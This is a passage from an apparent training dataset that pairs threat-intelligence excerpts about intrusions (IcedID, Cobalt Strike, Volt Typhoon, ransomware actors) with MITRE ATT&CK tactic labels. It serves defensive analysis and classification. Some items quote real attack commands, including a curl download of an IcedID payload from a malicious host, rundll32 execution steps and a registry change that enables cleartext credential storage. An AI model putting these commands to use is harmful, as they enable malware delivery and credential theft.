        "input": "Described attack activity: IcedID\nWhen the user executed the downloaded Javascript file,Document_Scan_468.js, the following happened:\nA bat file was created using a curl command to download the IcedID payload frommoashraya[.]com.C:\\Windows\\System32\\cmd.exe\" /c echo curl https://moashraya[.]com/out/t.php --output \"%temp%\\magni.waut.a\" --ssl no-revoke --insecure --location > \"%temp%\\magni.w.bat \nC:\\Windows\\System32\\cmd.exe\" /c echo curl https://moashraya[.]com/out/t.php --output \"%temp%\\magni.waut.a\" --ssl no-revoke --insecure --location > \"%temp%\\magni.w.bat \nExecution of the batch script.cmd.exe /c \"%temp%\\magnu.w.bat\" \ncmd.exe /c \"%temp%\\magnu.w.bat\" \nAfter downloading, the filemagni.waut.ais renamed tomagni.w.cmd.exe /c ren \"%temp%\\magni.waut.a\" \"magni.w\" \ncmd.exe /c ren \"%temp%\\magni.waut.a\" \"magni.w\" \nUsing rundll32.exe, it executes the functionscabwith the arguments\\k arabika752from the downloaded and renamed filemagni.w.rundll32 \"%temp%\\magni.w\", scab \\k arabika752 \nrundll32 \"%temp%\\magni.w\", scab \\k arabika752\nShortly after, we seerundll32.exeaccessing and injecting intosvchost.exe\nUsing memory captured from the system and processing it withMemprocFS;we can see via the memory, YARA scanning confirmation of the IcedID injection into process 4492.\nThis process then started communicating out to the following C2 domains:\newacootili[.]com (151.236.9[.]176) \nultrascihictur[.]com (159.223.95[.]82) \nmagiraptoy[.]com (194.58.68[.]187)\nAnd then deleted the file%temp%\\festival-.dat. This was most likely an update to the IcedID configuration which gets loaded.\nA summary of the discovery commands, and other activity can be seen in theDiscoverysection.\nDecoding the obfuscated javascript\nDocument_Scan_468.jsemployed a simple obfuscating technique. The technique consists of splitting the commands to be run into chunks of three, and concatenating them together. The same technique was used to obfuscate the JS functions as well.\nCobalt Strike DLL HTTPS Beacon\nThe first Cobalt Strike beacon was downloaded, and subsequently executed, by the threat actor from file.io through the following PowerShell commands.\nCobalt Strike PowerShell HTTPS Beacon\nVia the Cobalt Strike command and control server, the threat actor generated a PowerShell script which injected a stageless beacon into memory.\nIn the first part of the script, there are two defined functions,func_get_proc_addressandfunc_get_delegate_type, which are used to dynamically load and execute unmanaged code. Subsequently, a long BASE64 encoded string is defined which corresponds to the Cobalt Strike shellcode.\nThe BASE64 string is then XOR decoded with a decimal key equal to35. In order to inject the decoded shellcode, the script retrieves the function pointer for the Windows APIs functionGetModuleHandleAandGetProcAddressthat are needed to obtain a pointer toVirtualAlloc. The call to VirtualAlloc creates a new memory section with AllocationTypeMEM_COMMIT | MEM_RESERVERE(0x3000) and MemoryProtectionExecuteReadWrite(0x40). This type of variables passed to VirtualAlloc are classic signs of process injection. Subsequently, the shellcode is copied into the newly created region of memory and then executed through the Invoke() function.\nThe BASE64 string can be easily decoded through CyberChef to get the Cobalt Strike shellcode. It is possible to recognize the classic MZ header (magic_mz_x86andmagic_mz_x64):MZARUH.\nBy executing the PowerShell script and monitoring the API calls performed by the process through API Monitor, it is possible to identify the calls to InternetConnectA() with the Cobalt Strike C2s specified as parameters.\nExisting Yara rules detect Cobalt Strike beacons by hunting for the previously mentioned header like the following one, however, defenders need to be aware that those types of strings can be modified from beacons through malleable profiles.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the initial Emotet execution, three automated discovery commands were observed. These were then repeated, seen occurring once a day from the Emotet host.\nMultiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead.\nThe threat actor was observed querying a non-existent groupDomain controller,followed by a command correcting the mistake that queried the groupDomain controllers.\nA ping command issued to a user workstation and a domain controller were observed moments before lateral movement was attempted.\nInvoke-ShareFinderwas observed being used via Powershell in the environment from an injected process with Cobalt Strike:\nIn addition to theInvoke-ShareFindercommand, other functions that were used by the script were also observed.\nThe remnants ofInvoke-ShareFindercould also be seen on the network through the consistent querying of \"ADMIN$\" and \"C$\" shares for each host over a short period of time. In addition to these shares, a few shares from the file servers were also accessed.\nOnce on the domain controller, two batch files were run. The firstfind.batwas used to run AdFind.exe for Active Directory discovery.\nThe second script,p.bat,was run to sweep the network using ping, looking for network connectivity and online hosts.\nOn the final day, prior to ransom deployment, the threat actor also droppednetscan.exeon the server, and executed it from the Tactical RMM meshagent.exe session.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Attackers are increasingly turning to living-off-the-land techniques to attempt running undetected for as long as possible on systems. Because these attacks use multiple executables that are native to the system and have legitimate uses, they require a comprehensive, behavior-based approach to detection. \nLatest Astaroth living-off-the-land attacks are even more invisible but not less observable | Microsoft Security Blog Microsoft Threat Protection combines and orchestrates into a single solution the capabilities of multiple Microsoft security services to coordinate protection, detection, response, and prevention across endpoints, email, identities, and apps. \nIn the case of Astaroth, Office 365 ATP detects the malware delivery via email. Using detonation-based heuristics and machine learning, Office 365 ATP inspects links and attachments to identify malicious artifacts. \nOn endpoints, next-generation protection capabilities in Microsoft Defender ATP detect and prevent some components of Astaroth's new attack chain. Notably, through Antimalware Scan Interface (AMSI), Microsoft Defender ATP can inspect the encrypted malicious scripts used in the initial stages of the attack. \nFor the more sophisticated sections of the attack chain, behavioral blocking and containment capabilities provide dynamic protection that can stop malicious behaviors and process trees. Behavior-based protections are key to exposing livingoff-the-land threats that abuse and hide behind legitimate processes. These protections identify suspicious behavior sequences and advanced attack techniques observed on the client, which are used as triggers to analyze the process tree using real-time machine learning models in the cloud. \nThese behavior-based detections raise alerts in Microsoft Defender Security Center. With behavioral blocking and containment, not only are evasive threats exposed, detected, and stopped; security operations personnel are also notified so they can thoroughly investigate and remediate the root cause. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Despite going unreported on since 2013, Operation Ke3chang has not ceased operations and in fact continued developing its malware. Unit 42 was able to track the evolution of Operation Ke3chang's tools by observing unique behavioral quirks common throughout the malware's lineage. By pivoting on these behaviors in AutoFocus, we were able to assess a relationship between these families dating back to at least 2012 and the creation of TidePool, a new malware family continuing in Ke3chang's custom malware footsteps. While we can't know all of the groups' attacks using TidePool or older malware, we have uncovered its use against Indian Embassies, which was also documented in the 2013 report, indicating this is likely a high priority target as it has continued over multiple years.\nCustomers can utilize theKe3changResurfaces AutoFocus tagto examine the samples discussed in this post. IPS coverage for TidePool is provided by TID 14588.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A few minutes after its execution, Sliver launched the following commands to enumerate:\nLocal and domain admins. \nDomain computers. \nActive Directory trusts. \nNetwork adapters.\nAs with Sliver, Cobalt Strike was utilized to perform hands-on keyboard discovery activities.\nOn the beachhead host, the threat actor loaded in memory PowerView to perform further discovery activities. This specific action was identified through PowerShell Script Block Logging.\nPowerView was used to:\nGather the local admins.\nExtract the servers in the environment.\nThe $MFT showed also that in the first phases of the intrusion, the threat actor performed a BloodHound collection to likely identify paths to escalate privileges to domain admin.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the aforementioned instances, the exfiltration was accomplished using tools likeRcloneor frameworks like Cobalt Strike. The usage of the RDP protocol was once cited inWill the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltrationas a method of data exfiltration.\nInDead or Alive? An Emotet Story, the threat actor first created a copy of the relevant files before uploading them to MEGA. An example is given below:\nAs seen in theEmotet Strikes Again  LNK File Leads to Domain Wide Ransomwarereport, we can see how the threat actor used Rclone and MEGA:\nWe were able to draw attention to the attacker's skill in creatinga.zipfile containing LSASS in thePHOSPHORUS Automates Initial Access Using ProxyShellreport so that it could be exfiltrated and processed (presumably) offline. In this instance, a web shell was used to carry out the exfiltration:\nIn theQbot and Zerologon Lead To Full Domain Compromisereport, we were able to see the threat actor exfiltrate data using Cobalt Strike.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Discussed further in theCommand and Controlsection, the threat actor used multiple frameworks including Metasploit and Sliver. From the bash and Metasploit history we were able to identify the commands for various Metasploit payloads:\nMetasploit:\nT1059.003 Windows Command Shell\nFrom the Meterpreter history we observed theshellcommand used which will give the actor a standard shell on the target system.\nT1059.001 PowerShell\nSometimes they would then change to using PowerShell to execute certain commands.\nT1204.002 Malicious File\nSliver:\nThe threat actor generated a number of various Sliver beacons over the time they used the server.\nWe recovered the following beacons for both Windows and Linux:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant observed a clear evolution of the TTPs from the early stages of the campaign to its current form. \nStarting off with the initial payload served in explorer.ps1, where a custom decoding scheme was developed to the point where it got replaced with asymmetric encryption and the addition of the capability to track infected devices. \nFurthermore, the analysis of both EMPTYSPACE and QUIETBOARD suggests how the threat actors took a modular approach in developing their toolset. QUIETBOARD started by only having one module and then more functionality was incrementally added. Similarly, the Python variant of EMPTYSPACE shows clear signs of versioning. The use of multiple programming languages to create different versions of the EMPTYSPACE downloader and the URL change when the Vimeo video was taken down show a predisposition for experimentation and adaptability on the threat actors' side. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0270 often opts for a particular method using a LOLBin to conduct their credential theft, as this removes the need to drop common credential theft tools more likely to be detected and blocked by antivirus and endpoint detection and response (EDR) solutions. This process starts by enabling WDigest in the registry, which results in passwords stored in cleartext on the device and saves the actor time by not having to crack a password hash. \n\"reg\" add   \nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v   \nUseLogonCredential /t REG_DWORD /d 1 /f \nThe actor then uses rundll32.exe and comsvcs.dll with its built-in MiniDump function to dump passwords from LSASS into a dump file. The command to accomplish this often specifies the output to save the passwords from LSASS. The file name is also reversed to evade detections (ssasl.dmp): ",
        "output": "credential access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the intrusion, we noticed that the threat actors staging data of interest.  It is likely that the threat actor exfiltrated the data over the encrypted C2 channel; however, we observed no evidence of this activity.  Thentds.ditcan be used to dump hashes from the Active Directory, which can then be cracked using a tool like Hashcat. The filemf.txtcontained all dumped events with event id 4624. This could be analyzed offline to determine possible interesting accounts without actively querying the Active Directory. No specific exfiltration actions were observed, so anything taken was likely moved over existing command and control channels. The threat actor also appeared to be interested in some documents, but we only observed opening of those files, not any exfiltration attempts.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Approximately 20 seconds after the web shellaspx_wkggiyvttmu.aspxwas created, a flurry of POST requests were sent to the web shell.\nThe web shell followed a similar structure seen in previous cases. At least two parameters are sent in the POST request to the web shell,delimiterwhich defines what string is used to separate the response, andexec_codewhich is the command to be ran. The web shell had predefined functions for special actions:\nget Get file from location on disk (additionaldstPOST parameter) \nput Upload file to location (additionaldstPOST parameter) \nrun Execute a list of commands separated by \";\" using PowerShell.\nIfexec_codedoes not start with one of the above commands, it will simply attempt to run it with PowerShell.\nThe environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself. Below you can see an example of commands that were sent and the outputs they returned in the response.\nThe actor first uploaded a fileWininet.xml, which is later used to create a scheduled task, toC:\\windows\\tempusing theputcommand of the web shell. This was followed shortly by several commands to impair Windows Defender before downloading and executing a fakedllhost.exefrom 148.251.71[.]182.\nScheduled Task Commands:\nDefender Modification Command:\nThe schedule task runs a batch script calledWininet.batwhich was also uploaded through the web shell.Wininet.batsimply loops through the execution of the filedllhost.exe.\nThe filedllhost.exeis a golang binary. When executed, the binary was observed resolving the following domains:\napi.myip[.]com (for discovery) \ntcp443.msupdate[.]us \nkcp53.msupdate[.]us\nThe binary also spawns the following commands when executed:\ncmd /c wmic computersystem get domain \npowershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\nThebinaryhas a low confidence reference to FRP (FastReverseProxy) as the sample matches the closed source Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1(by Florian Roth) however it does not behave in the same way as the open source tool. This file also matches on an additional Yara rule more recently APT_MAL_Go_FRP_CharmingKitten_Jan22_1pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In incident response investigations and proactive research in the past year, we observed threat actors abusing administrative features to deploy and manage cryptocurrency mining resources in compromised tenants. Many of these attacks take advantage of automation, which increases the potential threat to cloud environments. \nCryptocurrency mining using central processing unit (CPU) or graphics processing unit (GPU) compute in cloud environments is not financially viable if one is paying for the compute used. In order to profit, threat actors use malicious methods to avoid paying for the resources, such as abusing free trials or compromising legitimate tenants to conduct cryptojacking attacks. \nUnlike free trial abuse, which the cloud provider may be able to detect, cryptojacking in compromised tenants is more challenging to identify since it involves the threat actor having access to a legitimate user account. This complex method impacts the user more directly, as it allows the threat actor to make more intrusive changes in the target environment: \nUtilize available compute quota from compromised tenants, and provision significantly more compute and other additional resources. Mask resource provisioning activity as legitimate when operating within a compromised tenant. Use access to the compromised tenant to do further lateral movement, achieve persistence, and conduct information theft. \nSuccessful cloud cryptojacking attacks could result in significant unexpected charges to the compromised tenant and depletion of resources that the tenant might need for business continuity, potentially resulting in service interruption, highlighting the need to prevent, detect and mitigate cloud cryptojacking attacks ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID\nThe malware configuration:\nInitially the IcedID malware made a connection to 64.227.12[.]180:80 for it's first call back. This aligns with the domain present in the malware configuration details.\nAfter the first call over an unencrypted port, command and control traffic moved over to TLS on port 443. Connections were made to various IP's over the length of the intrusion, but two made up the majority of the traffic.\nIcedID C2 beaconing over the intrusion:\nCobalt Strike\nThere were a number of beacons deployed across the environment, over 70 pipes were created. The beacons used recognizable default Cobalt Strike configurations and attempted to masquerade dropped files as legitimate Microsoft Windows executables. For example, on one host, we could observe over 20 pipes being created, in a pattern of postex_xxxx or MSSE-xxxx-server.\nWhen beacons were deployed within the environment, there was a significant increase in outbound network connections to C2 servers. For example, a beacon injected into a single Rundll32.exe process generated over 10K connections in a three hour window, consistently across two days.\nThe threat actors deployed various beacons over the course of the intrusion using different methods including executables, DLLs, and PowerShell beacons.\nOver the length of the intrusion four different Cobalt Strike servers were observed in use. Some lasted the majority of the intrusion while others only lasted a few days.\nCobalt Strike SSL characteristics:\nAnalysis of the Nigu.exe binary indicated use of compression and PE loading characteristics, typically observed for Cobalt Strike payload beacon. Using CAPA, the results listed the following capabilities:\nEmbedded within the binary were strings such as: \"inflate 1.2.11 Copyright 1995-2017 Mark Adler\". Once the file was unpacked and the Cobalt Strike beacon binary carved, the Cobalt Strike configuration could be determined as follows:\nConfigurations for other Cobalt Strike servers observed:\nRemote Access Software\nAs shown above, three different Remote Access Software were used by the threat actor:\nAtera \nSplashtop \nAnyDesk\nIt is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel.\nThe AnyDesk service password was set manually using the command line as shown below:\nThe software packages were bundled within a single Microsoft Software Installer (MSI) package, named hp.msi. This was installed from the ProgramData folder, resulting in the installation of the remote management tools. The activity can be correlated against the Application log for MSI installer events (Event ID 1033).",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Access was initiated by a phishing email leading to the Bazar Loader malware executable.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1489 Service Stop | Stopping of services prior to encryption T1486 Data Encrypted for Impact | Ransomware encryption ",
        "output": "impact",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Discovery data (AdFind and Rubeus outputs ) was exfiltrated out of the network via FTP.\n5.2.70.149:21",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: GALLIUM uses a variety of tools to perform reconnaissance and move laterally within a target network. The majority of these are off-the-shelf tools or modified versions of known security tools. MSTIC investigations indicate that GALLIUM modifies its tooling to the extent it evades antimalware detections rather than develop custom functionality. This behavior has been observed with GALLIUM actors across several operational areas. \nGALLIUM has been observed using several tools. Samples of the most prevalent are noted in Table 1. \nTable 1: GALLIUM tooling. \nGALLIUM has signed several tools using stolen code signing certificates. For example, they've used a credential dumping tool signed using a stolen certificate from Whizzimo, LLC, as shown in Figure 1. The code signing certificate shown in \nGALLIUM primarily relies on compromised domain credentials to move through the target network, and as outlined above, uses several credential harvesting tools. Once they have acquired credentials, the activity group uses PsExec extensively to move laterally between hosts in the target network. ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Just one hour and eleven minutes after initial access the threat actor started exfiltration activity. This was done from a file share server, performed with Rclone and exfiltrated to mega (Mega.nz).We have previously reported on the usage of rclone several times.\nWe were able to retrieve the Rclone configuration file used:\nAs shown above the configuration file is encrypted and password protected. Fortunately the threat actor had bad opsec and reused a password so we were able to decrypt the file using the \"rclone config show\" command:\nFrom Zeek network logs we see data being exfiltrated:\nSuricata was also alerting on the activity:\nFrom the network traffic we see HTTP posts done with rclone:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Remote Desktop Protocol\nAs expected after the RDP scan, the actor was observed performing lateral movement using the Remote Desktop Protocol from a single compromised server.While for remote interactive sign-ins the origin workstation name matched the targeted machines, network logons using both the same compromised accounts and the origin server had a workstation name ofWIN-RRRU9REOK18.\nBetween RDP connections, re-connections were observed as shown by the presence of logon types7(Unlock) indicating additional RDP activity took place on the file share and backup servers.\nWMIEXEC\nAs shown previously, the threat actor leveragedImpacket'sWMIEXECclassto perform lateral movement (specifically execution). Detecting such activity can be done through a combination of patterns available in process creation events (e.g. Sysmon event1) which have beenoutlined by CrowdStrike:\nAcommand-line startingwithcmd.exe /Q /c. \nAcommand-line ending with the redirection of outputsas 1> \\\\127.0.0.1\\{{share}}\\{{output}} 2>&1 where the output contains the current timestamp. \nA parent process ofwmiprvse.exedue to the usage of WMI.\nThe following capture is a subset of the attacker-initiated WMI-backed executions.\nRemote Services\nThroughout the intrusion, the threat actor relied on remote services for lateral movement. One of the commonly employed tactics relies on the deployment of malicious files, DLLs in our case, over SMB, followed by its execution through remote services.\nAs part of the file creation over SMB, the Security log's event5145(A network share object was checked to see whether client can be granted desired access) maintains traces of access checks performed prior to SMB actions being taken. As can be seen below, the5145event provides valuable network share insights, such as which user attempts to perform an operation and from where.\nSimilarly, these file creation events can also be observed via network logs like Zeek'ssmb_filesevents.\nAfter the file creation over SMB, the System event7045will register the service installations.\nIn these cases, the DLLs are believed to have been Cobalt Strike beacons towards the newly used23.108.57[.]83:443(sodiwugoc[.]com) command & control infrastructure.\nBesides the DLLs, the threat actor was seen performing one fileless lateral movement, where the remote service triggered the following PowerShell stager.\nUsing PowerShell logs' event4104(part ofPowerShell Script Tracing and Logging), one can recover the decoded PowerShell, which in this case executes shellcode into the PowerShell process itself.\nAs was the case for the previous shellcode, this stager retrieves the next stage using websockets from94.232.43[.]201:4444.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In addition to operating system and domain credentials, Volt Typhoon dumps information from local web browser applications. Microsoft has also observed the threat actors staging collected data in password-protected archives. ",
        "output": "collection",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the first Domain Controller, a Cobalt Strike service was installed:\nMultiple services were installed by Cobalt Strike across the environment, here are a few examples:\nCobalt Strikefirst callsOpenSCManagerWto create the service remotely, then starts it withStartServiceAfunction:\nRDP/interactive Logins\nVarious commands were executed to enable the RDP service on various hosts:\nIncrease the max RDP connections allowed, in this case a arbitrarily large number.\nThe threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant found evidence that the threat actor used RDP to pivot between systems that had limited internet access. The threat actor accessed numerous devices using RDP and executed several native Windows commands. On one device, the threat actors made use of the Windows Task Manager to dump the process memory belonging to LSASS. The threat actor also obtained the Azure AD Connect configuration, the associated AD service account, and the key material used to encrypt the service account credentials. The Azure AD Connect account is used to replicate the on-premise instance of Active Directory into Azure AD. In addition to this, the threat actor obtained the Active Directory Federation Services (ADFS) signing certificate and key material. This allowed the threat actor to forge a SAML token which could be used to bypass 2FA and conditional access policies to access Microsoft 365. The actor stopped Sysmon and Splunk logging on these devices and cleared Windows Event Logs. \nThe threat actors leveraged compromised privileged accounts and used SMB, remote WMI, remote scheduled tasks registration, and PowerShell to execute commands within victim environments. The threat actor used the protocols mainly to perform reconnaissance (notably using the native command tasklist.exe to inspect remote systems), distribute BEACON around the network, as well as run native Windows commands for credential harvesting. In some cases, the actors passed in a specific Kerberos ticket during the WMIC execution using the /authority:Kerberos flag to authenticate as computer accounts. Computer accounts by design have local administrator rights over the computer for which they are named. \nLateral Movement Between CSP and Downstream Clients \nCSPs have network filtering layers in place between their on-premises environment and downstream customer environments as an added security layer. Mandiant identified that the threat actor used the vSphere PowerCLI and custom PowerShell scripts configured to target the vCenter Web endpoint to export the virtual disk image of a specific networking device and copy it off the service provider's infrastructure. To authenticate to vCenter the threat actor used a stolen session cookie for a Privileged Access Management (PAM) account. Mandiant believes the threat actor was able to \nanalyze this virtual machine and identify devices within the CSP's network that were specifically allowed to communicate with targeted downstream customers. \nUsing this knowledge, the actor compromised the authorized source jump hosts that circumvented the network security restrictions of the service provider and downstream victim network. The actor compromised a customer administration account from one of the administration jump hosts used for customer administration within the CSP's environment. The CSP would connect via these jump hosts using dedicated customer admin accounts to interact with a downstream customer's infrastructure. The actor then performed lateral movement through RDP and the stolen target credentials towards the victim customer network. \nIn another case, the threat actor used Azure's builtin Run Command feature to execute commands on numerous downstream devices. The threat actor used native Windows tools to perform initial reconnaissance, credential theft and deploy Cobalt Strike BEACON to devices via PowerShell. \nThe actor then used this BEACON implant to persistently install CEELOADER as a Scheduled Task that ran on login as SYSTEM on specific systems. CEELOADER is downloader that decrypts a shellcode payload to execute in memory on the victim device. \nData Collection \nMandiant identified multiple attempts by the threat actor to dump the Active Directory database (ntds.dit) using the built-in ntdsutil.exe command. There was also evidence that the threat actor used Sysinternals ProcDump to dump the process memory of the LSASS process. In addition to this, Mandiant discovered that the threat actor had stolen the AD FS token signing certificate and the DKM key material. This would allow the threat actor to perform Golden SAML attacks and authenticate as any user into federated environments that used AD FS for authentication, such as Microsoft 365. \nThe threat actors performed data theft through several PowerShell commands, uploading several sequential archive files ending with the .7z extension. The threat actor uploaded these files to a webserver they presumably controlled. \nMandiant identified binaries that were configured to upload data to the Mega cloud storage provider. The threat actor deployed the tool in the %TEMP%\\d folder as mt.exe and mtt.exe. Owing to several mistakes made by the threat actor, Mandiant was able to identify that the execution of the renamed tool failed. Upon investigation, it appears that the Megatools binary used by the threat actors fails to execute if renamed. Due to this it is unclear whether the actor was able to successfully exfiltrate data to Mega using this method. \nMandiant also observed the threat actor access a victim's on-premises SharePoint server looking for sensitive technical documentation and credentials. \nThe threat actor then used the gathered credentials to move laterally around the network. \nApplication Impersonation \nMicrosoft Exchange and Exchange Online provide an impersonation role (titled   \nApplicationImpersonation) that grants an account the ability to access another account's mailbox and \"act as\" that mailbox owner. Mandiant identified that the threat actor was able to authenticate to an existing account that was previously granted the ApplicationImpersonation role; it is unclear how the actor obtained this initial access. \nThrough this account, Mandiant witnessed the threat actor use impersonation to access multiple mailboxes belonging to users within the victim organization. The threat actor also created a new account within the Microsoft 365 environment which Mandiant deems was for backup access in the event of detection. ",
        "output": "privilege escalation",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Using a very common persistence technique, the malware will add itself to the \"Userinit\" registry key to allow execution after every reboot. The key is located at: \n\\HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\Userinit",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Talos discovered three IPs linked to the DNSpionage domain: \n185.20.184.138   \n185.161.211.72   \n185.20.187.8 \nThe three IPs are hosted by DeltaHost. \nThe last one was used in a DNS redirection attack between September and November. Multiple nameservers belonging to the public sector in Lebanon and UAE, as well as some companies in Lebanon, were apparently compromised, and hostnames under their control were pointed to attacker-controlled IP addresses. The attackers redirected the hostnames to the IP 185.20.187.8 for a short time. Just before redirecting the IP, the attackers created a certificate matching the domain name with the Let's Encrypt service. \nIn this section, we will present all the DNS redirection instances we identified and the attackergenerated certificates associated with each. We don't know if the redirection attack was ultimately successful, or what exact purpose the DNS redirection served. However, the impact could be significant, as the attackers were able to intercept all traffic destined for these hostnames during this time. Because the attackers targeted email and VPN traffic specifically, they may have been used to harvest additional information, such as email and/or VPN credentials. \nAs incoming email would also be arriving at the attackers' IP address, if there was multi-factor authentication, it would allow the attackers to obtain MFA codes to abuse. Since the attackers were able to access email, they could carry out additional attacks or even blackmail the target. \nThe DNS redirection we identified occurs in multiple locations where there is no direct correlation of infrastructure, staff, or job routines. It also occurs in both the public and private sectors. Therefore, we believe it was not human error, nor a mistake by an administrative user within any of the impacted organisations. This was a deliberate, malicious attempt by the attackers to redirect DNS. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor was observed connecting to a file server from the Domain Controller and browsing multiple secretive documents on the system.\nAdditionally, we see the threat actor using 7-zip to collect the previously dumped ntds and a text file called mf.txt.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Performing parameter extraction this way means the adversary doesn't require a password parameter like conventional CHOPPER-style webshells do. This means that all parameter names can be random or chosen to blend in with the target application. ",
        "output": "defense evasion",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
